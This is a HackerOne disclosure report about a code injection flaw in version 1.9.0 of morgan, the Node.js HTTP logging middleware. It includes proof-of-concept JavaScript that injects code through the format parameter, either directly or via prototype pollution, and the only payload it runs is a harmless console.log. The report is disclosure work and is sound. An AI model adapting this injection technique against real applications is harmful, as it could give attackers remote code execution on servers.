@@ -1,0 +1,72 @@
+ReportLink:https://hackerone.com/reports/390881
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/cris_semmle
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:28.10.2018 10:16:18
+
+Summary:
+
+I would like to report a code injection vulnerability in morgan.
+It allows an attacker to inject arbitrary JS commands in certain situations.
+
+# Module
+
+**module name:** morgan
+**version:** 1.9.0
+**npm page:** `https://www.npmjs.com/package/morgan`
+
+## Module Description
+
+HTTP request logger middleware for node.js
+
+    Named after Dexter, a show you should not watch until completion.
+
+
+## Module Stats
+
+1,120,329 downloads in the last week
+
+# Vulnerability
+
+## Vulnerability Description
+
+An attacker can use the format parameter to inject arbitrary commands
+
+## Steps To Reproduce:
+
+The basic attack vector looks like this: 
+```js
+var morgan = require('morgan');
+var f = morgan('25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms');
+f({}, {}, function () {
+});
+```
+However, it is hard to believe that the package is used this way in any application. However, a more interesting attack vector is when combining this vulnerability with a prototype pollution one:
+
+```js
+var morgan = require('morgan');
+//payload delivered through a prototype pollution attack
+Object.prototype[':method :url :status :res[content-length] - :response-time ms'] = '25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms';
+//benign looking usage of morgan that can be exploited due to the prototype pollution attack
+var f = morgan(':method :url :status :res[content-length] - :response-time ms');
+f({}, {}, function () {
+});
+```
+Eval and it's variants like  Function() should almost neve be used in such popular packages.
+
+## Patch
+
+N/A remove the usage of Function().
+
+
+# Wrap up
+
+- I contacted the maintainer to let them know: N
+- I opened an issue in the related repository: N
+
+## Impact
+
+If combined with a prototype pollution attack this vulnerability is very serious (RCE). Otherwise, it is very unlikely that the attacker can control the vulnerable format parameter, but not impossible to think.
